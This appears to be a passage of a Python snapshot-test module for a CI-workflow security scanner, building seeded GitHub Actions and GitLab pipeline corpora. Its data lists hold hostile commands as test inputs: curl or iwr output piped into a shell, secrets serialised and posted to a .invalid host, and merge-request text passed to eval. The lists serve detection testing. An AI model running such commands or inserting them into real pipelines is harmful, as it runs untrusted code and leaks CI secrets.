"""The CI files' readers, held to their recorded outputs (_snapshots.py): GitHub Actions workflows and GitLab
CI files as the engine reads them (rust/crates/lazaret-engine/src/ci/; the `ci_*` calls), on seeded corpora.

Until BR-7 (0.1.9) both packages kept a reader of their own (scanner/ghworkflow.py and gitlabci.py,
js/src/lib/ghworkflow.js and gitlabci.js), held to each other case by case by test_js_parity_persistence
(its YAML part), test_js_parity_workflow_hardening and test_js_parity_gitlabci. The engine took the reading
over, and these sets are those tests' corpora; their hashes were recorded from the Python modules the engine
replaced, so the engine answered every case as they did.

The corpora: workflows built the way workflows are (a self-hosted runner, `toJSON(secrets)` in an
environment, event text in a command) and spliced from the lines workflows are made of; workflows built
from the forms each hardening check reads (`uses:` pinned and not, permissions in every form,
pull_request_target and release events, checkouts of a pull request, caches, installs, publishes, scripts
piped into a shell, continued lines), cut into malformed ones and written with Windows line ends; GitLab
pipelines (includes in every form, images and services with and without a digest, scripts as lists, block
scalars, strings and flow lists, OIDC tokens and registry credentials, a merge request's text in `eval`);
and the helpers on their own: the script-line checks, image references, flow collections, paths and
continued lines.

All content is inert text: hosts are .invalid, and nothing is executed.
"""
import json
import random
import unittest

from lazaret.scanner import _native
from tests.architecture import _snapshots

WF = ".github/workflows/w.yml"
GL = ".gitlab-ci.yml"


YAML_LINES = [
    "on: push", "on: [push, discussion]", "on:", "  discussion:", "  issues:", "  - issue_comment", "\"on\":",
    "'on': pull_request_target", "on: {issue_comment: {types: [created]}}", "jobs:", "  a:", "  process:",
    "    runs-on: self-hosted", "    runs-on: ubuntu-latest", "    runs-on: [self-hosted, linux]", "    runs-on:",
    "      - self-hosted", "      labels: [self-hosted]", "    env:", "      DATA: ${{ toJSON(secrets) }}",
    "      V: ${{ toJson( secrets ) }}", "    steps:", "      - uses: actions/checkout@v4",
    "      - uses: actions/upload-artifact@v4", "        with:", "          secrets: ${{ toJSON(secrets) }}",
    "      - run: echo ${{ github.event.discussion.body }}", "      - name: x", "        run: |", "        run: >-",
    "          echo ${{ github.event.issue.title }}", "          curl -d \"$D\" https://x.invalid", "",
    "          $DATA", "        run: echo \"${{ github.event.comment.body }}\" # c", "# comment", "---", "...",
    "- run: x", "steps:", "- name: y", "  run: 'a # b'", "  run: \"${{ github.head_ref }}\"", "\trun: tab",
    "key:value", "k: v:w", "  - - nested", "? complex", "  x: |2+", "      \u2028", "    \u00e9: \U0001F600",
    "      - run: echo ${{ " + "\U0001F600" * 300 + " github.event.issue.title }}",
    "      - run: echo ${{ " + "\U0001F600" * 499 + "github.head_ref}}", "      - run: echo ${{ " + "x" * 499 + " }} ${{ github.head_ref }}",
    "      - run: ${{${{ github.event.issue.body }}}} }}"]


def seeded_workflow(rnd):
    """A workflow built the way workflows are, in the forms each part takes."""
    c = rnd.choice
    on = c(["on: push", "on: [push, discussion]", "on:\n  discussion:\n    types: [created]", "\"on\":\n  - issue_comment",
            "on: {issues: {types: [opened]}}", "'on': pull_request_target", "on:\n  push:\n  issues:"])
    dash = c(["      ", "    "])                 # a step's dash: indented under steps:, or level with it
    lines = [c(["name: w", "# a workflow", ""]), on, "jobs:"]
    for j in range(rnd.randint(1, 3)):
        lines.append(f"  j{j}:")
        lines.append(c(["    runs-on: self-hosted", "    runs-on: ubuntu-latest", "    runs-on: [self-hosted, linux]",
                        "    runs-on:\n      - self-hosted", "    runs-on:\n      labels: [self-hosted]",
                        "    runs-on: ${{ matrix.os }}"]))
        if rnd.random() < 0.5:
            lines.append("    env:\n      " + c(["DATA: ${{ toJSON(secrets) }}", "V: ${{ toJson( secrets ) }}", "A: 1",
                                                 "T: ${{ github.event.issue.title }}"]))
        lines.append("    steps:" if dash == "      " else "    steps:")
        pad = dash + "  "
        for _ in range(rnd.randint(1, 4)):
            k = rnd.randrange(6)
            if k == 0:
                lines.append(dash + "- uses: " + c(["actions/checkout@v4", "actions/upload-artifact@v4", "a/b@v1"]))
                if rnd.random() < 0.5:
                    lines.append(pad + "with:\n" + pad + "  secrets: ${{ toJSON(secrets) }}")
            elif k == 1:
                lines.append(dash + "- run: " + c(["echo ${{ github.event.discussion.body }}", "echo hi", "npm test",
                                                   "curl -d \"$D\" https://x.invalid", "echo \"${{ github.head_ref }}\" # c",
                                                   "echo '${{ toJSON(secrets) }}'", "echo ${{ github.event.issue.number }}"]))
            elif k == 2:
                lines.append(dash + "- name: s\n" + pad + "run: " + c(["|", ">-", "|2"]) + "\n" + pad + "  " +
                             c(["echo ${{ github.event.comment.body }}", "cat <<EOF > f\n" + pad + "  $DATA\n" + pad + "  EOF",
                                "echo ok", "\n" + pad + "  echo ${{ github.event.pull_request.title }}"]))
            elif k == 3:
                lines.append(dash + "- env:\n" + pad + "  " + c(["D: ${{ toJSON(secrets) }}", "T: ${{ github.event.issue.body }}"])
                             + "\n" + pad + "run: echo \"$T\"")
            else:
                lines.append(c(YAML_LINES))
    return "\n".join(lines) + "\n"


def yaml_corpus(seed=20260928, count=2500):
    rnd = random.Random(seed)
    cases = []
    for _ in range(count):
        if rnd.random() < 0.6:
            cases.append(seeded_workflow(rnd))
            continue
        lines = []
        for _ in range(rnd.randint(1, 18)):
            line = rnd.choice(YAML_LINES)
            if rnd.random() < 0.15:
                line = " " * rnd.randrange(6) + line.lstrip(" ")
            lines.append(line)
        cases.append("\n".join(lines) + rnd.choice(["", "\n"]))
    return [json.loads(json.dumps(c)) for c in cases]


SHA = "0123456789abcdef0123456789abcdef01234567"
DIGEST = "sha256:" + "ab" * 32

WF_CURATED = [
    # an unpinned workflow with write permissions for every job
    "on: push\npermissions:\n  contents: write\n  id-token: write\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n"
    "      - uses: actions/checkout@v4\n      - uses: some/thing@main\n      - run: npm ci\n",
    # pinned, read only: nothing to say
    f"on: push\npermissions: read-all\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@{SHA} # v4\n",
    # a pull_request_target job that checks out the pull request, with and by command
    "on: pull_request_target\npermissions:\n  contents: read\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
    "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n"
    "  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          git fetch origin pull/1/head\n"
    "          git checkout ${{ github.head_ref }}\n",
    # a release that restores caches
    "on:\n  release:\n    types: [published]\npermissions:\n  contents: read\njobs:\n  p:\n    runs-on: ubuntu-latest\n"
    "    steps:\n      - uses: actions/cache@v4\n        with:\n          path: ~/.npm\n"
    "      - uses: actions/setup-node@v4\n        with:\n          cache: npm\n      - uses: actions/setup-go@v5\n"
    "      - uses: actions/setup-node@v4\n      - uses: actions/setup-python@v5\n        with:\n          cache: false\n",
    # an OIDC token, and installs, in the workflow's permissions and in a job's own
    "on: push\npermissions:\n  id-token: write\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm ci\n"
    "  b:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    steps:\n      - run: npm ci\n"
    "  c:\n    runs-on: ubuntu-latest\n    permissions: {id-token: write, contents: read}\n    steps:\n"
    "      - run: npm ci --ignore-scripts\n      - run: pip install x\n",
    # no permissions at all
    "on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n  b:\n    runs-on: ubuntu-latest\n"
    "    permissions: {}\n    steps:\n      - run: echo hi\n",
    # images, reusable workflows, local paths
    f"on: push\npermissions: {{}}\njobs:\n  a:\n    uses: org/repo/.github/workflows/w.yml@v1\n  b:\n    uses: ./.github/workflows/x.yml\n"
    f"  c:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: docker://alpine:3\n      - uses: docker://alpine@{DIGEST}\n"
    f"      - uses: ./local\n      - uses: org/repo/sub@{SHA}\n      - uses: org/repo@{SHA[:39]}\n",
    "", "on: push\n", "jobs:\n", "jobs:\n  a:\n", "- uses: x@v1\n", "permissions: write-all\n",
]


def uses():
    return ["actions/checkout@v4", "actions/checkout@" + SHA, "actions/cache@v4", "actions/cache/restore@" + SHA,
            "actions/setup-node@v4", "actions/setup-python@v5", "actions/setup-go@v5", "actions/setup-java@v4",
            "actions/setup-dotnet@v4", "ruby/setup-ruby@v1", "astral-sh/setup-uv@v5", "Swatinem/rust-cache@v2",
            "github/codeql-action/init@v3", "some/thing@main", "some/thing@" + SHA, "some/thing", "some/thing@",
            "docker://alpine:3", "docker://alpine@" + DIGEST, "docker://alpine@sha256:xyz", "./local", ".", "../x",
            "pypa/gh-action-pypi-publish@release/v1", "softprops/action-gh-release@v2", "org/repo/.github/workflows/w.yml@v1",
            "org/repo@1.2.3", "org/repo@v", "org/repo@V4", "  spaced/action@v1  "]


def withs(rnd):
    c = rnd.choice
    pick = [c(["ref: ${{ github.event.pull_request.head.sha }}", "ref: ${{ github.head_ref }}", "ref: main",
               "ref: refs/pull/${{ github.event.number }}/merge", "ref: ''"]),
            c(["repository: ${{ github.event.pull_request.head.repo.full_name }}", "repository: me/x"]),
            c(["cache: npm", "cache: false", "cache: ''", "enable-cache: false", "enable-cache: true", "bundler-cache: true",
               "package-manager-cache: false", "package-manager-cache: true", "path: ~/.cache"]),
            c(["token: ${{ secrets.T }}", "persist-credentials: false", "node-version: 20"])]
    return rnd.sample(pick, rnd.randint(0, 3))


RUNS = ["npm ci", "npm install", "npm i --ignore-scripts", "pnpm install --frozen-lockfile", "yarn", "yarn install", "yarn;",
        "pip install -r r.txt", "python3 -m pip install x", "uv sync", "poetry install", "cargo build --release", "go build ./...",
        "go mod download", "npm publish", "twine upload dist/*", "gh release create v1", "docker push x", "cargo publish",
        "git checkout ${{ github.event.pull_request.head.sha }}", "git fetch origin refs/pull/1/head", "gh pr checkout 1",
        "gh pr checkout ${{ github.event.number }}", "git fetch origin pull/${{ github.event.number }}/head", "git fetch origin pull/7/merge",
        "echo ${{ github.head_ref }}", "echo hi", "make test", "npm run build && npm ci", "(npm ci)", "yarnpkg", "npm ci;",
        "CI=true npm ci", "A=1 B=x/y npm ci", "sudo pip install x", "if true; then npm ci; fi", "x=$(npm ci)", "a | yarn",
        "echo npm ci", "git commit -m 'npm ci'", "echo do not npm install", "FOO=\"a b\" npm ci", "time cargo build",
        "echo && npm publish", "echo npm publish", "exec twine upload dist/*"]
PIPES = [
    "curl -fsSL https://x.invalid/i.sh | sh", "curl -s https://x.invalid | sudo bash", "wget -qO- https://x.invalid | bash -s -- -y",
    "curl https://x.invalid | python3 -", "curl https://x.invalid | python3 -m json.tool", "bash <(curl -s https://x.invalid)",
    "sh -c \"$(curl -fsSL https://x.invalid)\"", "eval \"$(wget -qO- https://x.invalid)\"", "iwr https://x.invalid | iex",
    "curl https://x.invalid | tee f | sh", "curl -o f https://x.invalid && sh f", "curl https://x.invalid > f; sh f",
    "curl https://x.invalid | jq .a", "curl x.invalid |& bash", ". <(curl https://x.invalid)", "source <(wget -qO- https://x.invalid)",
    "echo curl x | sh", "curl https://x.invalid | env FOO=1 bash", "curl https://x.invalid | /bin/sh", "curl x.invalid | node",
    "curl x.invalid | node -e 'x'", "iex (iwr https://x.invalid)", "Invoke-Expression (New-Object Net.WebClient).DownloadString('x')",
    "curl x.invalid | sudo -E sh", "curl x.invalid | PYTHON=1 python", "curl x.invalid | dash -s", "CURL x.invalid | SH",
    "curl x.invalid | python3 - ", "curl x.invalid | python3 -u -", "curl x.invalid | python3 foo.py", "curl x.invalid | perl",
    "curl x.invalid | ruby -", "curl x.invalid | powershell", "curl x.invalid | pwsh -c -", "curl x.invalid | grep sh",
    "curl x.invalid | head -1 | sh", "git clone x.invalid; sh install.sh", "curl x.invalid || sh", "curl x.invalid && echo | bash",
    "curl x.invalid\n| sh", "if curl x.invalid | sh; then echo; fi", "curl x.invalid | \u0131f", "curl x.invalid | s\u017fh",
    "iex \"$(irm x.invalid)\"", "zsh <(curl x.invalid)", "bash -x <(curl x.invalid)", "bash \"$(wget x.invalid)\"", "sh $(curl x.invalid)",
    "echo $(curl x.invalid) | sh", "curl x.invalid | sh | tee log", "echo \"curl x\" | sh", "sudo curl x.invalid | sh",
    "if curl -fsSL x.invalid | sh; then :; fi", "(curl x.invalid | sh)", "bash -c \"$(curl -fsSL x.invalid)\"",
    "bash -ec '$(curl x.invalid)'", "iex \"& { $(irm https://x.invalid) } -UseMSI\"", "bash -x \"$(curl x.invalid)\"",
    "eval <(curl x.invalid)", "while curl x.invalid | sh; do :; done", "if npm ci; then :; fi", "until npm publish; do :; done",
    "curl a.invalid | wget b.invalid | sh", "curl x.invalid; echo a | sh", "curl x.invalid\necho a | sh",
    "curl x.invalid | FOO=1 BAR=x/y sh", "curl x.invalid | sudo env A=1 sh", "curl x.invalid | env sh", "time curl x.invalid | sh"]
RUNS += PIPES
CONTINUED = [("curl -fsSL https://x.invalid \\", "| sh"), ("npm ci \\", "--ignore-scripts"), ("cargo \\", "build"),
             ("curl https://x.invalid \\", "-o f"), ("echo a \\", "&& curl x.invalid | bash"), ("npm \\", "publish"),
             ("curl x.invalid \\", "")]


def permissions(rnd, pad):
    c = rnd.choice
    return c([
        pad + "permissions: read-all", pad + "permissions: write-all", pad + "permissions: {}",
        pad + "permissions: {contents: write}", pad + "permissions: {id-token: write, contents: read}",
        pad + "permissions:\n" + pad + "  contents: read",
        pad + "permissions:\n" + pad + "  contents: write\n" + pad + "  id-token: write",
        pad + "permissions:\n" + pad + "  id-token: write\n" + pad + "  packages: read",
        pad + "permissions:\n" + pad + "  pull-requests: write"])


def hardened_workflow(rnd):
    c = rnd.choice
    on = c(["on: push", "on: pull_request_target", "on: [push, pull_request_target]", "on:\n  release:\n    types: [published]",
            "on:\n  pull_request_target:\n    types: [opened]", "on: workflow_dispatch", "on: pull_request",
            "\"on\":\n  - release", "on: {release: {types: [created]}}"])
    lines = [c(["name: w", "# a workflow", ""]), on]
    if rnd.random() < 0.6:
        lines.append(permissions(rnd, ""))
    lines.append("jobs:")
    for j in range(rnd.randint(1, 3)):
        if rnd.random() < 0.2:
            lines.append(f"  j{j}:\n    uses: {c(uses())}")
            continue
        lines.append(f"  j{j}:")
        lines.append("    runs-on: ubuntu-latest")
        if rnd.random() < 0.4:
            lines.append(permissions(rnd, "    "))
        lines.append("    steps:")
        for _ in range(rnd.randint(1, 5)):
            k = rnd.randrange(5)
            if k in (0, 1):
                lines.append("      - uses: " + c(uses()))
                w = withs(rnd)
                if w:
                    lines.append("        with:\n" + "\n".join("          " + x for x in w))
            elif k == 2:
                lines.append("      - run: " + c(RUNS))
            elif k == 3:
                a, b = c(CONTINUED) if rnd.random() < 0.3 else (c(RUNS), c(RUNS))
                lines.append("      - name: s\n        run: " + c(["|", ">-"]) + "\n          " + a + "\n          " + b)
            else:
                lines.append("      - name: n\n        uses: " + c(uses()) + "\n        with:\n          " + c(withs(rnd) or ["a: b"]))
    return "\n".join(lines) + "\n"


def wf_corpus(seed=20261003, count=1500):
    rnd = random.Random(seed)
    cases = list(WF_CURATED)
    for _ in range(count):
        text = hardened_workflow(rnd)
        if rnd.random() < 0.2:                   # cut: malformed files
            k = rnd.randrange(len(text) + 1)
            text = text[:k] + rnd.choice(["", "\n  - ", ": ", "{", "'", "\t"]) + text[k + rnd.randrange(4):]
        if rnd.random() < 0.15:                  # Windows line ends
            text = text.replace("\n", "\r\n")
        cases.append(text)
    return [json.loads(json.dumps(c)) for c in cases]


def groups(seed=7, count=300):
    """Lists of [line, text] as a script gives them: some end in a backslash."""
    rnd = random.Random(seed)
    pieces = ["a", "b \\", "\\", "", "x\\\\", "npm ci \\", "| sh", " ", "curl x.invalid \\"]
    return [[[i + 1, rnd.choice(pieces)] for i in range(rnd.randint(0, 6))] for _ in range(count)]


MR_LINES = [
    'eval "$CI_COMMIT_TITLE"', "eval '$CI_COMMIT_TITLE'", 'bash -c "deploy.sh $CI_COMMIT_BRANCH"', "bash -c 'echo $CI_COMMIT_BRANCH'",
    'sh -c "$CI_MERGE_REQUEST_TITLE"', 'sudo bash -ec "x ${CI_MERGE_REQUEST_DESCRIPTION}"', "$CI_COMMIT_TITLE",
    "FOO=1 $CI_COMMIT_MESSAGE arg", 'echo "$CI_COMMIT_TITLE"', "git checkout $CI_COMMIT_BRANCH", "eval $CI_COMMIT_TITLE",
    'eval "echo $CI_COMMIT_TAG_MESSAGE"', "x=$CI_COMMIT_TITLE", 'bash -c "echo ok" && echo "$CI_COMMIT_TITLE"', "bash -c eval",
    "eval", "eval ; $CI_COMMIT_TITLE", 'zsh -c "$CI_EXTERNAL_PULL_REQUEST_SOURCE_BRANCH_NAME"', 'ash -c "$CI_COMMIT_TITLE_X"',
    'dash -lc "$CI_COMMIT_DESCRIPTION"', '/bin/sh -c "$CI_COMMIT_REF_NAME"', 'sh -c "a" "$CI_COMMIT_TITLE"',
    'eval a "b" $CI_COMMIT_TITLE', "eval 'a' '$CI_COMMIT_TITLE'", 'bash -c "a \\" $CI_COMMIT_TITLE"', "if eval $CI_COMMIT_TITLE; then :; fi",
    "(eval $CI_MERGE_REQUEST_SOURCE_BRANCH_NAME)", 'echo "$CI_MERGE_REQUEST_LABELS" | sh', "bash -c '$CI_COMMIT_TITLE' \"$CI_COMMIT_TITLE\"",
    'eval "$CI_COMMIT_TITLE', "bash -c \"$CI_COMMIT_TITLE", "$CI_MERGE_REQUEST_TITLE_", "$CI_COMMIT_BRANCH_NAME", "${CI_COMMIT_BRANCH}", "$CI_COMMIT_BRANCH",
]
TOKENS = ["npm publish", "echo $NPM_TOKEN", "echo ${NODE_AUTH_TOKEN}", "twine upload -p $PYPI_API_TOKEN dist/*", "echo $PYPI_TOKEN",
          "echo $TWINE_PASSWORD", "echo $CARGO_REGISTRY_TOKEN", "echo $GEM_HOST_API_KEY", "echo $CI_JOB_JWT_V2", "echo $CI_JOB_JWT",
          "echo $PYPI_TOKENS", "echo $PYPI_X_Y_TOKEN", "echo $MY_NPM_TOKEN"]
COMMANDS = RUNS + MR_LINES + TOKENS + ['echo "a: b"', "echo a: b", "echo 'x: y' # done", 'curl -s "https://x.invalid" | sh -s -- -y', ""]

INCLUDE_ITEMS = [
    "local: '/ci/a.yml'", "local: ci/b.yml", "remote: 'https://x.invalid/ci.yml'", "remote: http://x.invalid/ci.yml",
    'remote: "HTTPS://X.invalid/c.yml"', "remote: ''", "template: Security/SAST.gitlab-ci.yml", "component: gitlab.com/g/p/c@1.2.3",
    "component: gitlab.com/g/p/c@~latest", f"component: gitlab.com/g/p/c@{SHA}", "component: gitlab.com/g/p/c@main",
    "component: gitlab.com/g/p/c@1", "component: gitlab.com/g/p/c@v2.0.1-rc.1", "component: gitlab.com/g/p/c", "component: gitlab.com/g/p/c@",
    "component: $CI_SERVER_FQDN/g/p/c@2.0.0", "component: gitlab.com/g/p/c@1.2.3.4", "component: gitlab.com/g/p/c@\u0661.\u0662.\u0663",
    "'https://x.invalid/plain.yml'", "http://x.invalid/plain.yml", "'ci/plain.yml'", "/ci/plain.yml", "HTTPS://X.INVALID/p.yml",
]
REFS = ["main", "v1.2", "1.0", SHA, "", "$CI_COMMIT_SHA", "${CI_COMMIT_SHA}", "release/2", SHA[:39], SHA.upper(), "'v3'", "v", "2024-01"]
IMAGES = ["python:3.12", "python:latest", "python", f"python:3.12@{DIGEST}", f"python@{DIGEST}", "python:3.12@sha256:xyz", "node:20-alpine",
          "registry.example.invalid:5000/team/app:1.0", "registry.example.invalid:5000/team/app", f"registry.example.invalid/x/y@{DIGEST}",
          "$CI_REGISTRY_IMAGE:latest", "${CI_REGISTRY_IMAGE}/app:$CI_COMMIT_SHA", "$CI_REGISTRY/x/y:1", "ghcr.io/x/y:v1", "postgres:16", "'redis:7'",
          "\"mysql:8\"", "  spaced:1  ", "x@sha256:" + "a" * 64, "x@SHA256:" + "a" * 64, "a/b:tag@" + DIGEST]
FLOWS = ["[a, b]", "[{remote: 'https://x.invalid/a.yml'}, local.yml, {project: g/p, ref: main, file: x}]", "{remote: https://x.invalid/b.yml}",
         "{project: g/p, ref: v1, file: [a.yml, b.yml]}", "[]", "{}", "[ ]", "plain", "'quoted'", "[\"a, b\", c]", "[a, [b, c], {d: e}]",
         "[{name: postgres:16, alias: db}, redis:7]", "{name: x:1, entrypoint: [\"\"]}", "[a", "{a: b", "[{a: b}, ", "[,,]", "{a: b: c}", "{'k': \"v\", k: w}",
         "[{component: gitlab.com/g/p/c@1.0.0, inputs: {a: 1}}]", "[:]", "{: x}", "{a}"]
PATHS = [".gitlab-ci.yml", ".gitlab-ci.yaml", "a/b/.gitlab-ci.yml", "x.gitlab-ci.yml", "x/ci.gitlab-ci.yaml", ".gitlab/ci/build.yml",
         ".gitlab/x.yaml", ".GITLAB/ci/build.YML", ".gitlab/issue_templates/Bug.md", "gitlab-ci.yml", ".gitlab-ci.yml.bak", "a\\.gitlab-ci.yml",
         "a\\.gitlab\\ci\\b.yml", "ci.yml", ".github/workflows/x.yml", ".gitlab", ".gitlab/", "", "x/.gitlab/y/z/w.yml"]


def include_section(rnd):
    c = rnd.choice
    form = rnd.randrange(7)
    if form == 0:
        return []
    if form == 1:                                                         # a string
        return ["include: " + c(["'https://x.invalid/s.yml'", "local.yml", "http://x.invalid/s.yml", ""])]
    if form == 2:                                                         # a flow list or map
        return ["include: " + c(FLOWS)]
    if form == 3:                                                         # a single map
        return ["include:"] + ["  " + x for x in c([["remote: https://x.invalid/m.yml"], ["project: g/p", "ref: main", "file: /a.yml"],
                                                    ["component: gitlab.com/g/p/c@1.0.0"], ["local: a.yml"], ["ref: v1", "project: g/p"]])]
    out = ["include:"]
    for _ in range(rnd.randint(1, 4)):
        k = rnd.randrange(3)
        if k == 0:
            out.append("  - " + c(INCLUDE_ITEMS))
        elif k == 1:
            ref = c(REFS)
            body = [f"project: '{c(['g/p', 'grp/sub/tpl', '$GROUP/tpl'])}'"] + ([f"ref: {ref}"] if ref else []) + [c(["file: '/x.yml'", "file:\n      - /a.yml\n      - /b.yml"])]
            if rnd.random() < 0.3:
                body.reverse()
            out.append("  - " + body[0])
            out.extend("    " + x for x in body[1:])
        else:
            out.append("  - " + c(INCLUDE_ITEMS))
            if rnd.random() < 0.5:
                out.append("    " + c(["inputs:\n      a: 1", "rules:\n      - if: $CI_X", "ref: main"]))
    return out


def image_lines(rnd, pad, key="image"):
    c = rnd.choice
    form = rnd.randrange(4)
    if form == 0:
        return [f"{pad}{key}: {c(IMAGES)}"]
    if form == 1:
        return [f"{pad}{key}:", f"{pad}  name: {c(IMAGES)}", f"{pad}  entrypoint: ['']"]
    if form == 2:
        return [f"{pad}{key}: {{name: {c(IMAGES)}, entrypoint: ['']}}"]
    return [f"{pad}{key}: {c(IMAGES)} # a comment"]


def service_lines(rnd, pad):
    c = rnd.choice
    form = rnd.randrange(3)
    if form == 0:
        return [f"{pad}services:"] + [f"{pad}  - {c(IMAGES)}" for _ in range(rnd.randint(1, 3))]
    if form == 1:
        return [f"{pad}services:", f"{pad}  - name: {c(IMAGES)}", f"{pad}    alias: db", f"{pad}  - {c(IMAGES)}"]
    return [f"{pad}services: [{c(IMAGES)}, {{name: {c(IMAGES)}, alias: x}}]"]


def script_lines(rnd, pad, key):
    c = rnd.choice
    form = rnd.randrange(5)
    if form == 0:
        return [f"{pad}{key}: {c(COMMANDS)}"]
    if form == 1:
        return [f"{pad}{key}: [{', '.join(json.dumps(c(COMMANDS)) for _ in range(rnd.randint(1, 3)))}]"]
    if form == 2:
        return [f"{pad}{key}:", f"{pad}  - |"] + [f"{pad}    {c(COMMANDS)}" for _ in range(rnd.randint(1, 3))] + [f"{pad}  - {c(COMMANDS)}"]
    if form == 3:
        cont = c([("curl -fsSL https://x.invalid \\", "| sh"), ("npm ci \\", "--ignore-scripts"), ("echo a \\", "&& npm ci"), ("npm \\", "ci")])
        return [f"{pad}{key}:", f"{pad}  - |", f"{pad}    {cont[0]}", f"{pad}    {cont[1]}"]
    return [f"{pad}{key}:"] + [f"{pad}  - {c(COMMANDS)}" for _ in range(rnd.randint(1, 4))]


def job(rnd, name, pad=""):
    c = rnd.choice
    out = [f"{pad}{name}:"]
    if rnd.random() < 0.4:
        out.append(f"{pad}  stage: {c(['build', 'test', 'deploy'])}")
    if rnd.random() < 0.5:
        out += image_lines(rnd, pad + "  ")
    if rnd.random() < 0.3:
        out += service_lines(rnd, pad + "  ")
    if rnd.random() < 0.25:
        out += [f"{pad}  id_tokens:", f"{pad}    ID_TOKEN:", f"{pad}      aud: https://x.invalid"]
    if rnd.random() < 0.15:
        out += [f"{pad}  secrets:", f"{pad}    KEY:", f"{pad}      vault: a/b/c@d"]
    if rnd.random() < 0.2:
        out += [f"{pad}  variables:", f"{pad}    image: python:3", f"{pad}    script: npm ci"]
    if rnd.random() < 0.15:
        out.append(f"{pad}  extends: .setup")
    for key in SCRIPT_KEYS:
        if key == "script" or rnd.random() < 0.35:
            out += script_lines(rnd, pad + "  ", key)
    return out


SCRIPT_KEYS = ("before_script", "script", "after_script")


def pipeline(rnd):
    c = rnd.choice
    lines = [c(["# a pipeline", "", "stages: [build, test]"])]
    lines += include_section(rnd)
    if rnd.random() < 0.3:
        lines += image_lines(rnd, "")
    if rnd.random() < 0.15:
        lines += service_lines(rnd, "")
    if rnd.random() < 0.2:
        lines += script_lines(rnd, "", c(["before_script", "after_script"]))
    if rnd.random() < 0.3:
        lines += ["default:"] + image_lines(rnd, "  ") + (["  id_tokens:", "    T:", "      aud: https://x.invalid"] if rnd.random() < 0.3 else []) \
            + (script_lines(rnd, "  ", "before_script") if rnd.random() < 0.5 else [])
    if rnd.random() < 0.3:
        lines += ["variables:", "  image: python:3", "  script: curl x.invalid | sh", "  include: https://x.invalid/v.yml"]
    if rnd.random() < 0.3:
        lines += [c([".setup: &setup", ".tpl:", "hidden: &h"]), f"  - {c(COMMANDS)}", f"  - {c(COMMANDS)}"]
    for j in range(rnd.randint(1, 4)):
        lines += job(rnd, c([f"job{j}", f".hidden{j}", "default2", "image", "include"]) if rnd.random() < 0.2 else f"job{j}")
    return "\n".join(lines) + "\n"


GL_CURATED = [
    "", "\n", "include:\n", "include: [\n", "job:\n  script:\n", "job:\n  script:\n    -\n", "job:\n  script:\n    - |\n",
    "image: python:3.12\n", f"image: python:3.12@{DIGEST}\n", "default:\n  image: node:20\n",
    f"include:\n  - project: g/p\n    ref: {SHA}\n    file: /a.yml\n  - project: g/p\n    file: /a.yml\n  - remote: https://x.invalid/a.yml\n",
    "build:\n  script:\n    - curl -fsSL https://x.invalid | sh\n    - echo \"$CI_COMMIT_TITLE\"\n",
    "publish:\n  id_tokens:\n    T:\n      aud: https://x.invalid\n  script:\n    - npm ci\n    - npm publish\n",
    "publish:\n  script:\n    - npm ci --ignore-scripts\n    - npm publish\n  id_tokens:\n    T:\n      aud: x\n",
    "default:\n  before_script:\n    - npm ci\n  id_tokens:\n    T:\n      aud: x\njob:\n  script:\n    - echo\n",
    "default:\n  before_script:\n    - npm ci\njob:\n  before_script:\n    - echo\n  id_tokens:\n    T:\n      aud: x\n  script:\n    - echo\n",
    "build:\r\n  image: python:3.12\r\n  script:\r\n    - curl x.invalid | sh\r\n",
    ".setup: &setup\n  - curl x.invalid | bash\nbuild:\n  script:\n    - *setup\n",
]


def gl_corpus(seed=20261004, count=1200):
    rnd = random.Random(seed)
    cases = list(GL_CURATED)
    for _ in range(count):
        text = pipeline(rnd)
        if rnd.random() < 0.2:                   # cut: malformed files
            k = rnd.randrange(len(text) + 1)
            text = text[:k] + rnd.choice(["", "\n  - ", ": ", "{", "'", "\t", "\"", "["]) + text[k + rnd.randrange(4):]
        if rnd.random() < 0.15:                  # Windows line ends
            text = text.replace("\n", "\r\n")
        cases.append(text)
    return [json.loads(json.dumps(c)) for c in cases]


def texts():
    """Every corpus's CI files."""
    return yaml_corpus() + wf_corpus() + gl_corpus()


def script_lines_corpus():
    """The script lines the line checks read: commands, fetches piped into a shell, merge request text, and
    continued lines joined with and without their backslash."""
    return sorted(set(COMMANDS)) + [line for a, b in CONTINUED for line in (a + " " + b, a[:-1] + " " + b)]


IMAGE_CASES = IMAGES + ["", "a@", "@b", ":", "a:b:c", "a/b:c/d", "host:1/x", "host:1/x:2@sha256:ab", "x:"]
PATH_CASES = PATHS + [".github/workflows/a.yml", "x/.GitHub/Workflows/b.YAML", ".github\\workflows\\c.yml",
                      ".github/a.yml", "workflows/a.yml", ".github/workflows/a.json", ".github/workflows/sub/"]
USES_CASES = uses() + ["", " ", "docker://", "docker://x", "a", "a/b", "a/b@", "@v1", "a/b@c@d", "./", "./x@v1",
                       "org/repo/sub/dir@" + SHA, "org/repo@" + SHA.upper(), "org/repo@refs/heads/main"]
CHECKS = ("pipe_to_shell", "install", "publish", "mr_text")


def snapshot_sets():
    return {
        "ci_outline": lambda: [c for t in texts() for c in (
            ("ci_outline", {}, t), ("ci_outline", {"items": True}, t),
            ("ci_outline", {"items": True, "seq_blocks": True}, t))],
        "ci_workflow": lambda: [c for t in texts() for c in (
            ("ci_workflow", {}, t), ("ci_uses", {}, t), ("ci_issues", {"path": WF}, t))],
        "ci_gitlab": lambda: [c for t in texts() for c in (("ci_gitlab", {}, t), ("ci_issues", {"path": GL}, t))],
        "ci_helpers": lambda: (
            [("ci_check", {"check": c}, line) for line in script_lines_corpus() for c in CHECKS]
            + [("ci_check", {"check": "parse_image"}, v) for v in IMAGE_CASES]
            + [("ci_check", {"check": "flow_items"}, v) for v in FLOWS]
            + [("ci_kind", {}, p) for p in PATH_CASES]
            + [("ci_parse_uses", {}, v) for v in USES_CASES]
            + [("ci_logical_lines", {"lines": g}, "") for g in groups()]),
    }


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class CiSnapshotTests(unittest.TestCase):
    def answers(self, name):
